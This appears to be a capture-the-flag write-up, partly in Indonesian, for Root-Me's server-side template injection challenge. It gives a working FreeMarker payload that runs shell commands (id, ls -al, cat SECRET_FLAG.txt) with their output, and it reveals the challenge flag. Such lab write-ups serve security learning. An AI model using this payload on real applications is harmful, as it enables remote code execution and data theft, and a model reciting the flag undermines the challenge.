@@ -1,0 +1,78 @@
+Server-side Template Injection
+
+https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion
+
+[Soal]
+
+Server-side Template Injection
+
+http://challenge01.root-me.org/web-serveur/ch41/
+
+[POC]
+
+Do I know you? Please send me your nickname : input wew
+It's seems that I know you :) wew
+
+Template Injection Methodology
+
+Detect -> Identify -> Exploit -> Read
+							  -> Explore
+							  -> Attack
+							  
+Check Http header
+http://challenge01.root-me.org/web-serveur/ch41/check
+
+POST /web-serveur/ch41/check HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept: text/plain, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+x-requested-with: XMLHttpRequest
+Referer: http://challenge01.root-me.org/web-serveur/ch41/
+Content-Length: 11
+Connection: keep-alive
+nickname=wew
+
+Test dengan hackbar addon mozilla
+Load url : http://challenge01.root-me.org/web-serveur/ch41/check
+Post Data : nickname=${9*9}
+
+Result : It's seems that I know you :) 81
+
+http://blog.portswigger.net/2015/08/server-side-template-injection.html 
+lihat pada bagian FreeMarker
+
+Code Exploit <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+
+Test dengan hackbar addon mozilla
+Load url : http://challenge01.root-me.org/web-serveur/ch41/check
+Post Data : nickname=<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+
+Result : It's seems that I know you :)  uid=1109(web-serveur-ch41) gid=1109(web-serveur-ch41) groups=1109(web-serveur-ch41)
+
+Test dengan hackbar addon mozilla
+Load url : http://challenge01.root-me.org/web-serveur/ch41/check
+Post Data : nickname=<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ls -al") }
+
+Result : It's seems that I know you :)  total 36
+drwxr-s---  5 web-serveur-ch41 www-data  4096 Oct 27 22:01 .
+drwxr-s--x 48 challenge        www-data  4096 Oct 28 19:55 ..
+-r--------  1 challenge        challenge  225 Oct 25 20:51 ._nginx.server-level.inc
+-rwx------  1 web-serveur-ch41 www-data   171 Oct 27 22:13 ._run
+-r--r-----  1 web-serveur-ch41 www-data    26 Oct 25 22:42 SECRET_FLAG.txt
+-r--r-----  1 web-serveur-ch41 www-data  2109 Oct 25 22:51 pom.xml
+dr-xr-x---  4 web-serveur-ch41 www-data  4096 Oct 25 22:42 src
+dr-xr-x---  9 web-serveur-ch41 www-data  4096 Oct 25 22:51 target
+dr-xr-x---  2 web-serveur-ch41 www-data  4096 Oct 25 22:42 webapp
+
+Test dengan hackbar addon mozilla
+Load url : http://challenge01.root-me.org/web-serveur/ch41/check
+Post Data : nickname=<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat SECRET_FLAG.txt") }
+
+Result : It's seems that I know you :)  B3wareOfT3mplat3Inj3ction
+
+# FLAG = B3wareOfT3mplat3Inj3ction
+
+Well done, you won 30 Points
